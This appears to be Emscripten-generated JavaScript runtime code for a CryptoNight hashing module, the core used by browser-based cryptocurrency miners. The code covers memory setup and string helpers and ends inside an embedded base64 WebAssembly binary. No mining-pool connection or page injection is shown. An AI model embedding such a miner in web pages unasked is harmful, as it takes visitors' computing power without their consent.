function UTF8ArrayToString(u8Array, idx) {
    var endPtr = idx;
    while (u8Array[endPtr]) ++endPtr;
    if (endPtr - idx > 16 && u8Array.subarray && UTF8Decoder) {
        return UTF8Decoder.decode(u8Array.subarray(idx, endPtr))
    } else {
        var u0, u1, u2, u3, u4, u5;
        var str = "";
        while (1) {
            u0 = u8Array[idx++];
            if (!u0) return str;
            if (!(u0 & 128)) {
                str += String.fromCharCode(u0);
                continue
            }
            u1 = u8Array[idx++] & 63;
            if ((u0 & 224) == 192) {
                str += String.fromCharCode((u0 & 31) << 6 | u1);
                continue
            }
            u2 = u8Array[idx++] & 63;
            if ((u0 & 240) == 224) {
                u0 = (u0 & 15) << 12 | u1 << 6 | u2
            } else {
                u3 = u8Array[idx++] & 63;
                if ((u0 & 248) == 240) {
                    u0 = (u0 & 7) << 18 | u1 << 12 | u2 << 6 | u3
                } else {
                    u4 = u8Array[idx++] & 63;
                    if ((u0 & 252) == 248) {
                        u0 = (u0 & 3) << 24 | u1 << 18 | u2 << 12 | u3 << 6 | u4
                    } else {
                        u5 = u8Array[idx++] & 63;
                        u0 = (u0 & 1) << 30 | u1 << 24 | u2 << 18 | u3 << 12 | u4 << 6 | u5
                    }
                }
            }
            if (u0 < 65536) {
                str += String.fromCharCode(u0)
            } else {
                var ch = u0 - 65536;
                str += String.fromCharCode(55296 | ch >> 10, 56320 | ch & 1023)
            }
        }
    }
}
Module.UTF8ArrayToString = UTF8ArrayToString;

function UTF8ToString(ptr) {
    return UTF8ArrayToString(HEAPU8, ptr)
}
Module.UTF8ToString = UTF8ToString;

function stringToUTF8Array(str, outU8Array, outIdx, maxBytesToWrite) {
    if (!(maxBytesToWrite > 0)) return 0;
    var startIdx = outIdx;
    var endIdx = outIdx + maxBytesToWrite - 1;
    for (var i = 0; i < str.length; ++i) {
        var u = str.charCodeAt(i);
        if (u >= 55296 && u <= 57343) u = 65536 + ((u & 1023) << 10) | str.charCodeAt(++i) & 1023;
        if (u <= 127) {
            if (outIdx >= endIdx) break;
            outU8Array[outIdx++] = u
        } else if (u <= 2047) {
            if (outIdx + 1 >= endIdx) break;
            outU8Array[outIdx++] = 192 | u >> 6;
            outU8Array[outIdx++] = 128 | u & 63
        } else if (u <= 65535) {
            if (outIdx + 2 >= endIdx) break;
            outU8Array[outIdx++] = 224 | u >> 12;
            outU8Array[outIdx++] = 128 | u >> 6 & 63;
            outU8Array[outIdx++] = 128 | u & 63
        } else if (u <= 2097151) {
            if (outIdx + 3 >= endIdx) break;
            outU8Array[outIdx++] = 240 | u >> 18;
            outU8Array[outIdx++] = 128 | u >> 12 & 63;
            outU8Array[outIdx++] = 128 | u >> 6 & 63;
            outU8Array[outIdx++] = 128 | u & 63
        } else if (u <= 67108863) {
            if (outIdx + 4 >= endIdx) break;
            outU8Array[outIdx++] = 248 | u >> 24;
            outU8Array[outIdx++] = 128 | u >> 18 & 63;
            outU8Array[outIdx++] = 128 | u >> 12 & 63;
            outU8Array[outIdx++] = 128 | u >> 6 & 63;
            outU8Array[outIdx++] = 128 | u & 63
        } else {
            if (outIdx + 5 >= endIdx) break;
            outU8Array[outIdx++] = 252 | u >> 30;
            outU8Array[outIdx++] = 128 | u >> 24 & 63;
            outU8Array[outIdx++] = 128 | u >> 18 & 63;
            outU8Array[outIdx++] = 128 | u >> 12 & 63;
            outU8Array[outIdx++] = 128 | u >> 6 & 63;
            outU8Array[outIdx++] = 128 | u & 63
        }
    }
    outU8Array[outIdx] = 0;
    return outIdx - startIdx
}
Module.stringToUTF8Array = stringToUTF8Array;

function stringToUTF8(str, outPtr, maxBytesToWrite) {
    return stringToUTF8Array(str, HEAPU8, outPtr, maxBytesToWrite)
}
Module.stringToUTF8 = stringToUTF8;

function lengthBytesUTF8(str) {
    var len = 0;
    for (var i = 0; i < str.length; ++i) {
        var u = str.charCodeAt(i);
        if (u >= 55296 && u <= 57343) u = 65536 + ((u & 1023) << 10) | str.charCodeAt(++i) & 1023;
        if (u <= 127) {
            ++len
        } else if (u <= 2047) {
            len += 2
        } else if (u <= 65535) {
            len += 3
        } else if (u <= 2097151) {
            len += 4
        } else if (u <= 67108863) {
            len += 5
        } else {
            len += 6
        }
    }
    return len
}
Module.lengthBytesUTF8 = lengthBytesUTF8;
var UTF16Decoder = typeof TextDecoder !== "undefined" ? new TextDecoder("utf-16le") : undefined;

function demangle(func) {
    var __cxa_demangle_func = Module.___cxa_demangle || Module.__cxa_demangle;
    if (__cxa_demangle_func) {
        try {
            var s = func.substr(1);
            var len = lengthBytesUTF8(s) + 1;
            var buf = _malloc(len);
            stringToUTF8(s, buf, len);
            var status = _malloc(4);
            var ret = __cxa_demangle_func(buf, 0, 0, status);
            if (getValue(status, "i32") === 0 && ret) {
                return Pointer_stringify(ret)
            }
        } catch (e) {} finally {
            if (buf) _free(buf);
            if (status) _free(status);
            if (ret) _free(ret)
        }
        return func
    }
    Runtime.warnOnce("warning: build with -s DEMANGLE_SUPPORT=1 to link in libcxxabi demangling");
    return func
}

function demangleAll(text) {
    var regex = /__Z[\\w\\d_]+/g;
    return text.replace(regex, (function(x) {
        var y = demangle(x);
        return x === y ? x : x + " [" + y + "]"
    }))
}

function jsStackTrace() {
    var err = new Error;
    if (!err.stack) {
        try {
            throw new Error(0)
        } catch (e) {
            err = e
        }
        if (!err.stack) {
            return "(no stack trace available)"
        }
    }
    return err.stack.toString()
}

function stackTrace() {
    var js = jsStackTrace();
    if (Module.extraStackTrace) js += "\\n" + Module.extraStackTrace();
    return demangleAll(js)
}
Module.stackTrace = stackTrace;
var WASM_PAGE_SIZE = 65536;
var ASMJS_PAGE_SIZE = 16777216;

function alignUp(x, multiple) {
    if (x % multiple > 0) {
        x += multiple - x % multiple
    }
    return x
}
var HEAP, buffer, HEAP8, HEAPU8, HEAP16, HEAPU16, HEAP32, HEAPU32, HEAPF32, HEAPF64;

function updateGlobalBuffer(buf) {
    Module.buffer = buffer = buf
}

function updateGlobalBufferViews() {
    Module.HEAP8 = HEAP8 = new Int8Array(buffer);
    Module.HEAP16 = HEAP16 = new Int16Array(buffer);
    Module.HEAP32 = HEAP32 = new Int32Array(buffer);
    Module.HEAPU8 = HEAPU8 = new Uint8Array(buffer);
    Module.HEAPU16 = HEAPU16 = new Uint16Array(buffer);
    Module.HEAPU32 = HEAPU32 = new Uint32Array(buffer);
    Module.HEAPF32 = HEAPF32 = new Float32Array(buffer);
    Module.HEAPF64 = HEAPF64 = new Float64Array(buffer)
}
var STATIC_BASE, STATICTOP, staticSealed;
var STACK_BASE, STACKTOP, STACK_MAX;
var DYNAMIC_BASE, DYNAMICTOP_PTR;
STATIC_BASE = STATICTOP = STACK_BASE = STACKTOP = STACK_MAX = DYNAMIC_BASE = DYNAMICTOP_PTR = 0;
staticSealed = !1;

function abortOnCannotGrowMemory() {
    abort("Cannot enlarge memory arrays. Either (1) compile with -s TOTAL_MEMORY=X with X higher than the current value " + TOTAL_MEMORY + ", (2) compile with -s ALLOW_MEMORY_GROWTH=1 which allows increasing the size at runtime, or (3) if you want malloc to return NULL (0) instead of this abort, compile with -s ABORTING_MALLOC=0 ")
}

function enlargeMemory() {
    abortOnCannotGrowMemory()
}
var TOTAL_STACK = Module.TOTAL_STACK || 5242880;
var TOTAL_MEMORY = Module.TOTAL_MEMORY || 16777216;
if (TOTAL_MEMORY < TOTAL_STACK) Module.printErr("TOTAL_MEMORY should be larger than TOTAL_STACK, was " + TOTAL_MEMORY + "! (TOTAL_STACK=" + TOTAL_STACK + ")");
if (Module.buffer) {
    buffer = Module.buffer
} else {
    if (typeof WebAssembly === "object" && typeof WebAssembly.Memory === "function") {
        Module.wasmMemory = new WebAssembly.Memory({
            "initial": TOTAL_MEMORY / WASM_PAGE_SIZE,
            "maximum": TOTAL_MEMORY / WASM_PAGE_SIZE
        });
        buffer = Module.wasmMemory.buffer
    } else {
        buffer = new ArrayBuffer(TOTAL_MEMORY)
    }
}
updateGlobalBufferViews();

function getTotalMemory() {
    return TOTAL_MEMORY
}
HEAP32[0] = 1668509029;
HEAP16[1] = 25459;
if (HEAPU8[2] !== 115 || HEAPU8[3] !== 99) throw "Runtime error: expected the system to be little-endian!";
Module.HEAP = HEAP;
Module.buffer = buffer;
Module.HEAP8 = HEAP8;
Module.HEAP16 = HEAP16;
Module.HEAP32 = HEAP32;
Module.HEAPU8 = HEAPU8;
Module.HEAPU16 = HEAPU16;
Module.HEAPU32 = HEAPU32;
Module.HEAPF32 = HEAPF32;
Module.HEAPF64 = HEAPF64;

function callRuntimeCallbacks(callbacks) {
    while (callbacks.length > 0) {
        var callback = callbacks.shift();
        if (typeof callback == "function") {
            callback();
            continue
        }
        var func = callback.func;
        if (typeof func === "number") {
            if (callback.arg === undefined) {
                Module.dynCall_v(func)
            } else {
                Module.dynCall_vi(func, callback.arg)
            }
        } else {
            func(callback.arg === undefined ? null : callback.arg)
        }
    }
}
var __ATPRERUN__ = [];
var __ATINIT__ = [];
var __ATMAIN__ = [];
var __ATEXIT__ = [];
var __ATPOSTRUN__ = [];
var runtimeInitialized = !1;
var runtimeExited = !1;

function preRun() {
    if (Module.preRun) {
        if (typeof Module.preRun == "function") Module.preRun = [Module.preRun];
        while (Module.preRun.length) {
            addOnPreRun(Module.preRun.shift())
        }
    }
    callRuntimeCallbacks(__ATPRERUN__)
}

function ensureInitRuntime() {
    if (runtimeInitialized) return;
    runtimeInitialized = !0;
    callRuntimeCallbacks(__ATINIT__)
}

function preMain() {
    callRuntimeCallbacks(__ATMAIN__)
}

function exitRuntime() {
    callRuntimeCallbacks(__ATEXIT__);
    runtimeExited = !0
}

function postRun() {
    if (Module.postRun) {
        if (typeof Module.postRun == "function") Module.postRun = [Module.postRun];
        while (Module.postRun.length) {
            addOnPostRun(Module.postRun.shift())
        }
    }
    callRuntimeCallbacks(__ATPOSTRUN__)
}

function addOnPreRun(cb) {
    __ATPRERUN__.unshift(cb)
}
Module.addOnPreRun = addOnPreRun;

function addOnInit(cb) {
    __ATINIT__.unshift(cb)
}
Module.addOnInit = addOnInit;

function addOnPreMain(cb) {
    __ATMAIN__.unshift(cb)
}
Module.addOnPreMain = addOnPreMain;

function addOnExit(cb) {
    __ATEXIT__.unshift(cb)
}
Module.addOnExit = addOnExit;

function addOnPostRun(cb) {
    __ATPOSTRUN__.unshift(cb)
}
Module.addOnPostRun = addOnPostRun;

function intArrayFromString(stringy, dontAddNull, length) {
    var len = length > 0 ? length : lengthBytesUTF8(stringy) + 1;
    var u8array = new Array(len);
    var numBytesWritten = stringToUTF8Array(stringy, u8array, 0, u8array.length);
    if (dontAddNull) u8array.length = numBytesWritten;
    return u8array
}
Module.intArrayFromString = intArrayFromString;

function intArrayToString(array) {
    var ret = [];
    for (var i = 0; i < array.length; i++) {
        var chr = array[i];
        if (chr > 255) {
            chr &= 255
        }
        ret.push(String.fromCharCode(chr))
    }
    return ret.join("")
}
Module.intArrayToString = intArrayToString;

function writeStringToMemory(string, buffer, dontAddNull) {
    Runtime.warnOnce("writeStringToMemory is deprecated and should not be called! Use stringToUTF8() instead!");
    var lastChar, end;
    if (dontAddNull) {
        end = buffer + lengthBytesUTF8(string);
        lastChar = HEAP8[end]
    }
    stringToUTF8(string, buffer, Infinity);
    if (dontAddNull) HEAP8[end] = lastChar
}
Module.writeStringToMemory = writeStringToMemory;

function writeArrayToMemory(array, buffer) {
    HEAP8.set(array, buffer)
}
Module.writeArrayToMemory = writeArrayToMemory;

function writeAsciiToMemory(str, buffer, dontAddNull) {
    for (var i = 0; i < str.length; ++i) {
        HEAP8[buffer++ >> 0] = str.charCodeAt(i)
    }
    if (!dontAddNull) HEAP8[buffer >> 0] = 0
}
Module.writeAsciiToMemory = writeAsciiToMemory;
if (!Math.imul || Math.imul(4294967295, 5) !== -5) Math.imul = function imul(a, b) {
    var ah = a >>> 16;
    var al = a & 65535;
    var bh = b >>> 16;
    var bl = b & 65535;
    return al * bl + (ah * bl + al * bh << 16) | 0
};
Math.imul = Math.imul;
if (!Math.fround) {
    var froundBuffer = new Float32Array(1);
    Math.fround = (function(x) {
        froundBuffer[0] = x;
        return froundBuffer[0]
    })
}
Math.fround = Math.fround;
if (!Math.clz32) Math.clz32 = (function(x) {
    x = x >>> 0;
    for (var i = 0; i < 32; i++) {
        if (x & 1 << 31 - i) return i
    }
    return 32
});
Math.clz32 = Math.clz32;
if (!Math.trunc) Math.trunc = (function(x) {
    return x < 0 ? Math.ceil(x) : Math.floor(x)
});
Math.trunc = Math.trunc;
var Math_abs = Math.abs;
var Math_cos = Math.cos;
var Math_sin = Math.sin;
var Math_tan = Math.tan;
var Math_acos = Math.acos;
var Math_asin = Math.asin;
var Math_atan = Math.atan;
var Math_atan2 = Math.atan2;
var Math_exp = Math.exp;
var Math_log = Math.log;
var Math_sqrt = Math.sqrt;
var Math_ceil = Math.ceil;
var Math_floor = Math.floor;
var Math_pow = Math.pow;
var Math_imul = Math.imul;
var Math_fround = Math.fround;
var Math_round = Math.round;
var Math_min = Math.min;
var Math_clz32 = Math.clz32;
var Math_trunc = Math.trunc;
var runDependencies = 0;
var runDependencyWatcher = null;
var dependenciesFulfilled = null;

function getUniqueRunDependency(id) {
    return id
}

function addRunDependency(id) {
    runDependencies++;
    if (Module.monitorRunDependencies) {
        Module.monitorRunDependencies(runDependencies)
    }
}
Module.addRunDependency = addRunDependency;

function removeRunDependency(id) {
    runDependencies--;
    if (Module.monitorRunDependencies) {
        Module.monitorRunDependencies(runDependencies)
    }
    if (runDependencies == 0) {
        if (runDependencyWatcher !== null) {
            clearInterval(runDependencyWatcher);
            runDependencyWatcher = null
        }
        if (dependenciesFulfilled) {
            var callback = dependenciesFulfilled;
            dependenciesFulfilled = null;
            callback()
        }
    }
}
Module.removeRunDependency = removeRunDependency;
Module.preloadedImages = {};
Module.preloadedAudios = {};
var memoryInitializer = null;

function integrateWasmJS(Module) {
    var method = Module.wasmJSMethod || "native-wasm";
    Module.wasmJSMethod = method;
    var wasmTextFile = Module.wasmTextFile || "c.wast";
    var wasmBinaryFile = Module.wasmBinaryFile || "wasm.dat";
    var asmjsCodeFile = Module.asmjsCodeFile || "cryptonight.temp.asm.js";
    if (typeof Module.locateFile === "function") {
        wasmTextFile = Module.locateFile(wasmTextFile);
        wasmBinaryFile = Module.locateFile(wasmBinaryFile);
        asmjsCodeFile = Module.locateFile(asmjsCodeFile)
    }
    var wasmPageSize = 64 * 1024;
    var asm2wasmImports = {
        "f64-rem": (function(x, y) {
            return x % y
        }),
        "f64-to-int": (function(x) {
            return x | 0
        }),
        "i32s-div": (function(x, y) {
            return (x | 0) / (y | 0) | 0
        }),
        "i32u-div": (function(x, y) {
            return (x >>> 0) / (y >>> 0) >>> 0
        }),
        "i32s-rem": (function(x, y) {
            return (x | 0) % (y | 0) | 0
        }),
        "i32u-rem": (function(x, y) {
            return (x >>> 0) % (y >>> 0) >>> 0
        }),
        "debugger": (function() {
            debugger
        })
    };
    var info = {
        "global": null,
        "env": null,
        "asm2wasm": asm2wasmImports,
        "parent": Module
    };
    var exports = null;

    function lookupImport(mod, base) {
        var lookup = info;
        if (mod.indexOf(".") < 0) {
            lookup = (lookup || {})[mod]
        } else {
            var parts = mod.split(".");
            lookup = (lookup || {})[parts[0]];
            lookup = (lookup || {})[parts[1]]
        }
        if (base) {
            lookup = (lookup || {})[base]
        }
        if (lookup === undefined) {
            abort("bad lookupImport to (" + mod + ")." + base)
        }
        return lookup
    }

    function mergeMemory(newBuffer) {
        var oldBuffer = Module.buffer;
        if (newBuffer.byteLength < oldBuffer.byteLength) {
            Module.printErr("the new buffer in mergeMemory is smaller than the previous one. in native wasm, we should grow memory here")
        }
        var oldView = new Int8Array(oldBuffer);
        var newView = new Int8Array(newBuffer);
        if (!memoryInitializer) {
            oldView.set(newView.subarray(Module.STATIC_BASE, Module.STATIC_BASE + Module.STATIC_BUMP), Module.STATIC_BASE)
        }
        newView.set(oldView);
        updateGlobalBuffer(newBuffer);
        updateGlobalBufferViews()
    }
    var WasmTypes = {
        none: 0,
        i32: 1,
        i64: 2,
        f32: 3,
        f64: 4
    };

    function fixImports(imports) {
        if (!0) return imports;
        var ret = {};
        for (var i in imports) {
            var fixed = i;
            if (fixed[0] == "_") fixed = fixed.substr(1);
            ret[fixed] = imports[i]
        }
        return ret
    }

    function getBinary() {
        try {
            var binary;
            if (Module.wasmBinary) {
                binary = Module.wasmBinary;
                binary = new Uint8Array(binary)
            } else if (Module.readBinary) {} else {
                throw "on the web, we need the wasm binary to be preloaded and set on Module[\'wasmBinary\']. emcc.py will do that for you when generating HTML (but not JS)"
            }
            return binary
        } catch (err) {
            abort(err)
        }
    }

    function getBinaryPromise() {
        if (!Module.wasmBinary && typeof fetch === "function") {
            var raw = "AGFzbQEAAAABUw5gA39/fwBgA39/fwF/YAF/AX9gAX8AYAABf2ACf38Bf2AEf39/fwBgAn9/AGADf39+AGADf35/AGAEf39+fwF/YAR/f39/AX9gA35+fwF+YAAAAqsDFwNlbnYORFlOQU1JQ1RPUF9QVFIDfwADZW52CFNUQUNLVE9QA38AA2VudglTVEFDS19NQVgDfwADZW52BWFib3J0AAMDZW52DWVubGFyZ2VNZW1vcnkABANlbnYOZ2V0VG90YWxNZW1vcnkABANlbnYXYWJvcnRPbkNhbm5vdEdyb3dNZW1vcnkABANlbnYHX2dtdGltZQACA2VudgdfX19sb2NrAAMDZW52C19fX3N5c2NhbGw2AAUDZW52C19fX3NldEVyck5vAAMDZW52CV9fX3VubG9jawADA2VudgZfZnRpbWUAAgNlbnYWX2Vtc2NyaXB0ZW5fbWVtY3B5X2JpZwABA2VudgxfX19zeXNjYWxsNTQABQNlbnYNX19fc3lzY2FsbDE0MAAFA2VudgxfX19zeXNjYWxsMjAABQNlbnYOX19fYXNzZXJ0X2ZhaWwABgNlbnYNX19fc3lzY2FsbDE0NgAFA2VudgZtZW1vcnkCAYACgAIDZW52BXRhYmxlAXABDg4DZW52Cm1lbW9yeUJhc2UDfwADZW52CXRhYmxlQmFzZQN/AAM+PQIEAwcHAwQABAMGAAAAAAcHCAYICQAAAAoDBwALBgYGAwEEAQIMAgMFBAIBAQIEAQICDQECAQEFCwYCAQAGHwZ/ASMAC38BIwELfwEjAgt/AUEAC38BQQALfwFBAAsH1QIXCXN0YWNrU2F2ZQAREV9jcnlwdG9uaWdodF9oYXNoABoIc2V0VGhyZXcAFAxkeW5DYWxsX3ZpaWkASQdfZmZsdXNoAEAHX21lbXNldABDBV9zYnJrAEQTX2NyeXB0b25pZ2h0X2NyZWF0ZQAYB19tZW1jcHkARQpzdGFja0FsbG9jABALZ2V0VGVtcFJldDAAFgtzZXRUZW1wUmV0MAAVDGR5bkNhbGxfaWlpaQBIG19lbXNjcmlwdGVuX2dldF9nbG9iYWxfbGliYwA5CmR5bkNhbGxfaWkARxRfY3J5cHRvbmlnaHRfZGVzdHJveQAZEV9fX2Vycm5vX2xvY2F0aW9uAD4FX2ZyZWUANwtydW5Qb3N0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